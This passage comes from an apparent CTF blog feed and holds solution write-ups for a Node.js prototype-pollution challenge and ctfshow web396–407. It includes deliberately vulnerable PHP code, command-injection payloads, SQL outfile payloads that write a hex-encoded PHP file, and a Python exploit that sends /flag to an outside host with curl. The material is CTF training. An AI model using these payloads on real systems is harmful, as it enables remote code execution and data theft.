class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;shit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&quot;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">res.toString.constructor(\&quot;return this\&quot;)</span></span><br><span class="line"><span class="string">().process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;whoami\&quot;).toString();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个payload在网上直接找是可以找到的，看起来并不是很难</p><p>这里就直接抓包弹shell了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    p = sys.argv</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python web3.py http://xxx.com/&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    url = p[<span class="number">1</span>].strip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload=&#123;<span class="string">&quot;shit&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;shellcode&quot;</span>:<span class="string">&#x27;&#x27;&#x27;let res = import(&#x27;./app.js&#x27;)</span></span><br><span class="line"><span class="string">    res.toString.constructor(&quot;return this&quot;)</span></span><br><span class="line"><span class="string">    ().process.mainModule.require(&quot;child_process&quot;).execSync(&quot;curl http://ip:8888/ -F file=@/flag&quot;).toString();&#x27;&#x27;&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">    requests.post(url,headers=headers,data=json.dumps(payload))</span><br></pre></td></tr></table></figure><p>用法</p><p><img src="../images/image-20230403230446064.png" alt="image-20230403230446064"></p><p>然后监听端口就行了，然后就会反弹到自己的服务器上了</p><p>这里不知道为啥用bp弹不上去，只能用py脚本才能弹上去</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;决赛wp ————&amp;gt;    &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&amp;amp;mid=2247484079&amp;amp;idx=1&amp;amp;sn=74a1712eb4cbf5c905ea80e92</summary>
      
    
    
    
    
    <category term="杭师校赛决赛" scheme="https://ke1nys.github.io/tags/%E6%9D%AD%E5%B8%88%E6%A0%A1%E8%B5%9B%E5%86%B3%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-其他 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/f0c9bda6.html"/>
    <id>https://ke1nys.github.io/posts/f0c9bda6.html</id>
    <published>2023-03-30T13:04:08.000Z</published>
    <updated>2023-04-06T06:48:36.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.parse-url.php">parse_url</a> 的解释</p><p><img src="../images/image-20230330211747698.png" alt="image-20230330211747698"></p><p>然后这样的话host为空，就只有path了</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://1/1;echo `ls`&gt;a.txt</span><br><span class="line">url=http://1/1;echo `cat fl0g.php`&gt;a.txt</span><br></pre></td></tr></table></figure><p>这里的;换成||也行</p><h2 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是不影响</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web398-401"><a href="#web398-401" class="headerlink" title="web398-401"></a>web398-401</h2><p>一模一样的payload</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><p>因为它的正则匹配都是匹配host,然而我们的payload用的不是关于host的，用的是path的，所以说host一直为空，所以这个正则就一直绕过去了</p><h2 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话新增加了一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是必须得满足这个玩意</p><p>然后scheme会匹配文件头http，所以就不能用了，那么我们就用另一个</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增加的正则是对ip的判断，要满足才能进行命令执行</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h2 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h2><p>题目</p><h2 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure><p>这里的话要满足host  path  scheme   三个条件</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=httphp:<span class="comment">//127.0.0.1111;echo `cat f*`&gt;1.txt;11/a</span></span><br></pre></td></tr></table></figure><p>这里是<strong>scheme://host/path</strong></p><p>记住这个格式就好</p><p><img src="../images/image-20230330224805520.png" alt="image-20230330224805520"></p><p>所以就能绕过</p><h2 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kuaile1314/p/12319042.html">filter_var()绕过</a></p><p>这里是添加了sql语句来的，与上面给的文章说的内容不同，给的文章是利用JavaScript绕过</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&#x27;select flag from flag into outfile &quot;/var/www/html/1.txt&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">转为<span class="number">16</span>进制</span><br><span class="line">http:<span class="comment">//a53d40ee-9871-49a0-8f4a-5463bc97e052.chall.ctf.show/?url=0://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c203d2773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f312e74787422273b24726573756c74203d2024636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/&quot;/var/www/html/4.php&quot;%23</span></span><br><span class="line"></span><br><span class="line">访问<span class="number">1</span>.txt即可</span><br><span class="line">转化为<span class="number">16</span>进制绕过filter检测</span><br></pre></td></tr></table></figure><p>这里就是先把当</p><p><img src="../images/image-20230331155504698.png" alt="image-20230331155504698"></p><p>就会执行sql语句，然后把payload写到4.php上，然后访问4.php就会执行payload写的语句，然后访问1.txt就行了</p><h2 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IPv6的128位地址通常写成8组，每组为四个十六进制数的形式。比如：AD80:0000:0000:0000:ABAA:0000:00C2:0002 是一个合法的IPv6地址。这个地址比较长，看起来不方便也不易于书写。零压缩法可以用来缩减其长度。如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示</p><p><strong>call_user_func</strong></p><p><img src="../images/image-20230331160426788.png" 